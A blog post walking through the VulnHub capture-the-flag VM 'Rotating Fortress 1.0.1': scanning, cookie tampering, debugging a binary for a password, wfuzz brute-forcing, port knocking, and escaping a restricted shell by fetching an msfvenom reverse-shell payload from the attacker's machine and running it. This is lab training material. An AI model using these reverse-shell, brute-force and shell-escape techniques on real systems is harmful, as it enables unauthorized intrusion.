---
layout: post
date: 2018-08-15 07:37:27 +0000
last_modified_at: 2018-08-15 14:59:01 +0000
title: "Rotating Fortress: 1.0.1 Walkthrough"
category: Walkthrough
tags: [VulnHub, "Rotating Fortress"]
comments: true
image:
  feature: rotating-fortress-1.0.1-walkthrough.jpg
  credit: Bru-nO / Pixabay
  creditlink: https://pixabay.com/en/window-opening-sun-light-3495156/
---

This post documents the complete walkthrough of Rotating Fortress: 1.0.1, a boot2root [VM][1] created by [c0rruptedb1t][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

Zeus the admin of the server is retiring from Project: Rotating Fortress, but he doesn't want the project to die with his retirement. To find the successor to the project he has created a challenge. Will you be able to get in, rotate the fortress, escape isolation and reach `root`?

### Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.129
...
PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
27025/tcp open  unknown syn-ack ttl 64
| fingerprint-strings:
|   DNSStatusRequestTCP, GenericLines, X11Probe:
|     Connection establised
|     Requesting Challenge Hash...
|   FourOhFourRequest, GetRequest, HTTPOptions, LPDString, NULL, RTSPRequest, SSLSessionReq, TLSSessionReq:
|     Connection establised
|     Requesting Challenge Hash...
|_    Connection Closed: Access Denied [Challenge Hash Did Not Return Any Results From Database]
```

`nmap` finds `80/tcp` and `27025/tcp` open; `27025/tcp` is an unknown service. In any case, let's investigate `80/tcp` first.

### Flag: 1

Here's what the web service looks like as rendered in the browser.

![Janus.php](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/29ed819c.png)

According to [Wikipedia](https://en.wikipedia.org/wiki/Janus),

> In ancient Roman religion and myth, Janus (/ˈdʒeɪnəs/; Latin: IANVS (Iānus), pronounced [ˈjaː.nus]) is the god of beginnings, gates, transitions, time, duality, doorways, passages, and endings.

It's apt that Janus is overlooking the first flag. If you look at the cookies storage, you'll realize it's trivial to get the first flag.

![Cookies](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/9a82a999.png)

Change the value of `isAdmin` to `1` and refresh the page `/Janus.php`.

![Flag: 1](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/d096b090.png)

### Flag: 2

This brings us to the next stage, `/LELv3FfpLrbX1S4Q2FHA1hRtIoQa38xF8dzc8O9z/home.html`

![Wheel](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/750686de.png)

To be honest, the page was giving a lot of Mandarin's Lessons vibe in Iron Man 3. I got petrified for a while. I didn't know what to think until hours later. :laughing:

I did my best to determine the directories and files starting at this level. This is what I find.

+ `/resources` has directory indexing
+ `/icons` has directory indexing
+ `/robots.txt` exists and has the following disallowed entries:
  + `/icons/loki.bin` is an ELF executable
  + `/eris.php` exists

The messages at `/news.html` are also making my head spin.

![news.html](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/c59689d9.png)

I didn't bother with `/eris.php` because according to [Wikipedia](https://en.wikipedia.org/wiki/Eris_(mythology)),

> Eris (/ˈɪərɪs, ˈɛrɪs/; Greek: Ἔρις, "Strife") is the Greek goddess of strife and discord.

Let's take apart the puny `/icons/loki.bin` to calm myself. I don't know about you, but I always go for the strings first.

![strings](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/1042caf8.png)

Is this the password?

![access_denied](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/5cb35de2.png)

Apparently not, but look what happens when you supply `backd00r_pass123` as the password?

![GDB](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/adb17656.png)

Internally, the program is comparing `backd00r_pass123` with `xBspsiONMSNXeVuiomF`.

I think I've seen enough. Let's quit the debugger and enter `xBspsiONMSNXeVuiomF` as the password.

![Flag: 2](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/66e3c981.png)

Now that I know that the cipher of these messages, let's write a script to decipher them for the sake of completeness. The script takes in two arguments: the message as seen in the browser and the key.

<div class="filename"><span>decrypt.sh</span></div>

```bash
 #!/bin/bash

FILE=$1
KEY=$2

echo "[+] Trying $KEY..."

for x in $(cat $FILE | sed -r -e 's/^\|//' -e 's/\|$//' -e 's/\|\|/\n/g'); do
  grep -E "^[0-9]+$" <<<"$x" &>/dev/null && \
    printf "\\$(printf "%o" $((x + $KEY)))\n" || \
      echo "$x"
done \
| tr -d '\n' \
| sed -e 's/\+\+/ /g' -e 's/\/\//./g'

echo
echo "-----"
```

Since we don't know the key (hey, I don't read Martian), let's loop the script through 1 to 99 for each message.

_Message 1. The key is 52 or 84._

```
# for key in $(seq 1 99); do ./decrypt.sh msg1.txt $key; done
...
[+] Trying 52...
ZEUS HERE. AFTER A LONG TIME OF THINKING I HAVE DECIDED TO RETIRE FROM PROJECT ROTATING FORTRESS. HOWEVER I DO NOT WANT TO KILL THE PROJECT WITH MY RETIREMENT SO I AM PRESENTING YOU ALL A CHALLENGE. I HAVE SET UP A PUZZLE ON THE SERVER IF YOU CAN GET PAST ALL PUZZLES THE SERVER IS YOURS. BY THE WAY I HAVE REMOVED EVERYBODIES LOGINS FROM THE SERVER EXPECT MINE SO THIS WONT BE EASY. TAKE THIS IT MIGHT BE USEFUL EDVQYHWMFVQRDUCQJBZUMYSRWDGMFDHT. GOOD LUCK.
-----
...
[+] Trying 84...
zeus here. after a long time of thinking i have decided to retire from project rotating fortress. however i do not want to kill the project with my retirement so i am presenting you all a challenge. i have set up a puzzle on the server if you can get past all puzzles the server is yours. by the way i have removed everybodies logins from the server expect mine so this wont be easy. take this it might be useful edvqyhwmfvqrducqjbzumysrwdgmfdht. good luck.
-----
...
```

_Message 2. The key is 29 or 61._

```
# for key in $(seq 1 99); do ./decrypt.sh msg2.txt $key; done
...
[+] Trying 29...
WE WILL BE RESTRICTING ACCESS TO THE SERVER UNTIL FURTHER NOTICE FOR AN EVENT. ANTHENA.
-----
...
[+] Trying 61...
we will be restricting access to the server until further notice for an event. anthena.
-----
...
```

_Message 3. The key is -3 or -35._

```
# for key in $(seq 1 99); do ./decrypt.sh msg2.txt -$key; done
...
[+] Trying -3...
zeus has asked me to make an encoder for our updates. this is me testing it out. if it works i will be sending it to the rest of you as well as a decoder. tir.
-----
...
[+] Trying -35...
ZEUS HAS ASKED ME TO MAKE AN ENCODER FOR OUR UPDATES. THIS IS ME TESTING IT OUT. IF IT WORKS I WILL BE SENDING IT TO THE REST OF YOU AS WELL AS A DECODER. TIR.
-----
...
```

Turns out that `edvqyhwmfvqrducqjbzumysrwdgmfdht` from Message 1 is the wheel code for `/wheel.php`. With that, you get access to view a video at `/resources/wheel.mp4`, something about unlocking the wheel. ¯\\\__(ツ)\__/¯

### Flag: 3

Armed with `decrypt.sh`, I went back to decipher the message at `home.html` which was actually part of `/resources/Harpocrates.gif`.

![Harpocrates.gif](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/def1561a.png)

```
# for key in $(seq 1 99); do ./decrypt.sh home.txt $key; done
...
[+] Trying 7...
INSIDE
-----
...
[+] Trying 39...
inside
-----
...
```

Hmmm. Could this be a hint to look 'inside' `/Harpocrates.gif`? But damn, the file is large at 128M.

![Flag: 3](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/897ce9ef.png)

Sneaky indeed.

Let's decipher the link. The key appears to be `101`, which is decimal `5`.

```
# ./decrypt.sh inside.txt -5
[+] Trying -5...
pfychgdpvmxpupdkmcvctggquyfmgvbt
-----
```

I guess I'm supposed to go to `/pfychgdpvmxpupdkmcvctggquyfmgvbt/`.

### Flag: 4

WTF. Another Janus??!!

![Janus.php](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/f7c47a89.png)

Too bad the same trick of changing the value of the cookie to `1` doesn't work twice.

![Cookie Manager](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/cf273d2b.png)

Let's throw whatever we have gathered so far at it. Zeus said it might be useful.

![Cookie Manager](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/d6c9166e.png)

Awesome.

![Flag: 4](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/aab89ded.png)

### Flag: 5

According to [Wikipedia](https://en.wikipedia.org/wiki/Papa_Legba),

>Papa Legba is a loa in Haitian Vodou, who serves as the intermediary between the loa and humanity. He stands at a spiritual crossroads and gives (or denies) permission to speak with the spirits of Guinee, and is believed to speak all human languages. In Haiti, he is the great elocutioner. Legba facilitates communication, speech, and understanding.

![Papa Legba](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/0f6ca83c.png)

The HTML source seems to suggest that the password length is 9. And, another hint—visit `/chat.php`.

![HTML Source](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/9f0f8705.png)

OK. Let's go to `/chat.php`.

![chat.php](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/4c88b34b.png)

The chat page is more of a distraction than anything useful, while the **Download** button, allows you to download `/papa_legba.zip`. The archive contains the following files.

```
# unzip -l papa_legba.zip
Archive:  papa_legba.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
   902511  2018-07-27 05:31   papa_legba.mp3
  1522499  2018-07-27 12:13   scramble.jpg
---------                     -------
  2425010                     2 files


```

The file `papa_legba.mp3` contains audio Morse code, and [decodes](https://morsecode.scphillips.com/labs/audio-decoder-adaptive/) to this.

![Morse Code](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/1f733f3d.png)

The file `scramble.jpg` looks like this.

![scramble.jpg](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/06007b5e.png)

Recall the hint that the password length is 9. We have a 9x9 square matrix here. Perhaps the password comprises one character from each column?

Because a 9x9 matrix has 9<sup>9</sup> or 387,420,489 combinations, it doesn't make sense to try every single combination. Instead, we are going to make an assumption—the password contains non-repeating characters from each column.

To that end, I wrote this script to generate the wordlist.

<div class="filename"><span>scramble.py</span></div>

```python
#!/usr/bin/env python

from sets import Set
from itertools import product

s1 = Set(['O','W','V','S','I','U','C','F','O'])
s2 = Set(['D','Z','Y','W','V','O','W','H','Q'])
s3 = Set(['B','Z','G','Z','O','Y','U','J','B'])
s4 = Set(['A','O','W','X','K','J','B','Y','U'])
s5 = Set(['F','J','S','Y','V','B','E','W','C'])
s6 = Set(['L','W','J','U','R','Y','X','Q','W'])
s7 = Set(['C','M','V','Y','X','Q','P','J','Y'])
s8 = Set(['U','S','N','J','V','V','U','K','C'])
s9 = Set(['K','V','P','Z','T','O','V','C','X'])

s1 -= s2
s2 -= s3
s3 -= s4
s4 -= s5
s5 -= s6
s6 -= s7
s7 -= s8
s8 -= s9
s9 -= s1

iterables = [ s1, s2, s3, s4, s5, s6, s7, s8, s9]

for t in product(*iterables):
  print ''.join(list(t))

```

The wordlist I generate, `passwords.txt` contains 840,000 password candidates—much more manageable than 387,420,489.

Next, I use `wfuzz` to brute-force the password field.

```
wfuzz -w passwords.txt -d "password=FUZZ" -t 100 --hh 803 http://192.168.30.129/pfychgdpvmxpupdkmcvctggquyfmgvbt/Papa_Legba/index.php
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://192.168.30.129/pfychgdpvmxpupdkmcvctggquyfmgvbt/Papa_Legba/index.php
Total requests: 840000

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

370871:  C=200     34 L	      87 W	    883 Ch	  "IHGAERMNT"

```

![Flag: 5](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/4f77b8f1.png)

### Knocking on Heaven's Door

Following the previous flag's trail, I come to this.

![Knock Knock](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/6d0cc361.png)

Let's put the notes onto the music sheet. The rest are that: rest values. They are safe to ignore.

![Notes](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/b1cb4bb2.png)

If Middle C or C4 is 39993, and if we count the space and line as steps, then the following is true. I know it's highly unscientific—I'm not musically inclined. :stuck_out_tongue_winking_eye:

```
G4 = 39993 + 4 = 39997
B4 = 39993 + 6 = 39999
E5 = 39993 + 9 = 40002
```

The sequence of notes then becomes `39997, 40002, 39999, 39997, 39993, 39993`, reading from left to right.

With that in mind, let's write a port-knocking script using `nmap`, sending one `SYN` packet per port following the sequence.

<div class="filename"><span>knock.sh</span></div>

```bash
#!/bin/bash

TARGET=$1
PORTS="39997,40002,39999,39997,39993,39993"

echo "[*] Trying sequence $PORTS..."
for port in $(echo $PORTS | tr ',' ' '); do
    nmap -n -v0 -Pn --max-retries 0 -p $port $TARGET
done

sleep 3

nmap -n -v -Pn -p- -A --reason $TARGET -oN ${PORTS}.txt
```

Let's give it a shot.

```
PORT      STATE SERVICE     REASON         VERSION
80/tcp    open  http        syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
1337/tcp  open  waste?      syn-ack ttl 64
| fingerprint-strings:
|   GenericLines, GetRequest:
|     Connection establised
|     Welcome back L0k1...
|     Here is your to do list:
|     password input for shell[]
|     hide traffic[]
|     Hide this shell in wheel isolation from Zeus, he got rid of my other backdoor[x]
|     cmd_list.txt not found defaulting...
|     Command List:
|     about
|     echo
|     nano
|     modules
|     help
|     ping
|     self_check
|     touch
|     quit
|     whoami
|     Unknown Command
|   NULL:
|     Connection establised
|     Welcome back L0k1...
|     Here is your to do list:
|     password input for shell[]
|     hide traffic[]
|     Hide this shell in wheel isolation from Zeus, he got rid of my other backdoor[x]
|     cmd_list.txt not found defaulting...
|     Command List:
|     about
|     echo
|     nano
|     modules
|     help
|     ping
|     self_check
|     touch
|     quit
|_    whoami
27025/tcp open  unknown     syn-ack ttl 64
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     Connection establised
|     Requesting Challenge Hash...
|   NULL:
|     Connection establised
|     Requesting Challenge Hash...
|_    Connection Closed: Access Denied [Challenge Hash Did Not Return Any Results From Database]
40000/tcp open  safetynetp? syn-ack ttl 64
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest:
|     Connection establised
|     Please enter all the flags you have collected (not seperated, only data inside '{}'):
|     Incorrect Flag
|   NULL:
|     Connection establised
|     Please enter all the flags you have collected (not seperated, only data inside '{}'):
|   RPCCheck, SSLSessionReq:
|     Connection establised
|     Please enter all the flags you have collected (not seperated, only data inside '{}'):
|_    Error Closing Connection...
```

Awesome. We have two more open ports: `1337/tcp` and `40000/tcp`.

### Flag: 6

One of the newly open ports, `40000/tcp`, upon connection, displays the following message to enter all the flags collected so far.

![Enter The Flags](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/06b724f0.png)

Let's enter the flags we have so far.

![One-Way Shell](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/5796446b.png)

Zeus' 1-way shell has a weakness—it allows the use of subshell. To bypass the restricted 1-way shell, I'm transferring a reverse shell over to `/tmp/rev` with `wget` running in a subshell. Over at my machine, I'm hosting a reverse shell (generated with `msfvenom`) with Python **SimpleHTTPServer** module.

On my machine, I use the following `msfvenom` options to generate the reverse shell.

```
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.30.128 LPORT=4444 --platform linux -a x64 -f elf -o rev
No encoder or badchars specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: rev
```

_Here, I'm executing `wget` in a subshell._

![wget](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/9f483d07.png)

_The `wget` is successful._

![SimpleHTTServer](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/464e989a.png)

Let's get ourselves a proper shell.

_Here, I'm making `rev` executable._

![chmod +x](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/1e11d8ed.png)

_Caught the reverse shell, and spawning a proper shell._

![Reverse Shell](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/78dd1c75.png)

Once I've the shell, it's trivial to find the sixth flag. It's at `/home/www-data/deamon/Flag_6.txt`

![Flag: 6](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/a0606dc6.png)

### In the Land of Zeus

The message says the password of `zeus` is `7daLI]tr09u2~ATXVfzXkd#B=TVf5XOIQMZr98yf53k<2x`. Let's give it a shot.

![Zeus](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/64abb422.png)

I sense the end is near.

![sudo](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/090eee64.png)

Of course Zeus can do anything. He is the king of the Greek gods after all.

### Capturing the Rotating Fortress

![Flag](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/2ec2e93f.png)

:dancer:

### Afterthought

I had a fun time looking up the name of the deities and supernatural beings on Wikipedia, and understanding their characteristics and the role they play in the VM.

These are the deities and supernatural beings that appeared in the VM, not in any order of appearance:

1. [Janus](https://en.wikipedia.org/wiki/Janus)
2. [Loki](https://en.wikipedia.org/wiki/Loki)
3. [Eris](https://en.wikipedia.org/wiki/Eris_(mythology))
4. [Zeus](https://en.wikipedia.org/wiki/Zeus)
5. [Harpocrates](https://en.wikipedia.org/wiki/Harpocrates)
6. [Hecate](https://en.wikipedia.org/wiki/Hecate)
7. [Anthena](https://en.wikipedia.org/wiki/Athena) [sic]
8. [Tir](https://en.wikipedia.org/wiki/Tir_(god))
9. [Papa Legba](https://en.wikipedia.org/wiki/Papa_Legba)

[1]: https://www.vulnhub.com/entry/rotating-fortress-101,248/
[2]: https://twitter.com/@c0rruptedb1t
[3]: https://www.vulnhub.com/
